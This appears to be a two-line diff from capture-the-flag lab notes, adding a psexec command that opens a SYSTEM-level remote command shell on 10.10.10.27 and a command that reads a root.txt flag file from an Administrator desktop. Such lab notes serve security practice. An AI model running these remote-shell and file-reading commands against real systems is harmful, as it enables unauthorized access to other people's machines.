@@ -1,0 +1,2 @@
+psexec.exe -s \\10.10.10.27 cmd
+type \Users\user\Administrator\Desktop\root.txt
